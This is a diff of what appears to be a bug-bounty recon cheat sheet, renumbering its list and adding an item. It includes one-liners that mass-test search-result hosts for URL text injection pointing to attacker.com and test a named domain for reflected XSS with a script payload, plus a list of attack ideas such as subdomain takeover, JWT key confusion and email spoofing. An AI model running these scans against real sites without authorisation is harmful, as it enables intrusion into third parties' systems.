@@ -121,23 +121,24 @@ naabu
 
 
 
-1)text injection in url  - google --search inurl:vimeo --pages 1 | while read host do; do curl --silent https://$host/.htaccess__________hello%20every_one%20currently%20this%20website%20under%20construction%20so%20please%20visit%20https://attacker.com___ | grep -q attacker && \printf "$host \033[0;31mVulnerable\n"; done
+-)text injection in url  - google --search inurl:vimeo --pages 1 | while read host do; do curl --silent https://$host/.htaccess__________hello%20every_one%20currently%20this%20website%20under%20construction%20so%20please%20visit%20https://attacker.com___ | grep -q attacker && \printf "$host \033[0;31mVulnerable\n"; done
 
-2)sybdomain takeover - subzy,aquatone,subjack
-3)open redirects
-4)waybackurls
-5)paramspider
+-)sybdomain takeover - subzy,aquatone,subjack
+-)open redirects
+-)broken link hijacking
+-)waybackurls
+-)paramspider
 paramspider -d unifytwin.com --subs false --placeholder '"/><script>confirm(1)</script>' > optimizely.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
 
 
 
-6) prototype pollution using objects
+-) prototype pollution using objects
 
-7)github exposing sensitive data - trufflehog etc
-8)Dos by setting long passwords
-9)email swapping - eg. send a mail to a victim which is signed by apple
+-)github exposing sensitive data - trufflehog etc
+-)Dos by setting long passwords
+-)email swapping - eg. send a mail to a victim which is signed by apple
 
-9)jwt forging JWT HS/RSA key confusion vulnerability
+-)jwt forging JWT HS/RSA key confusion vulnerability
 
 
 
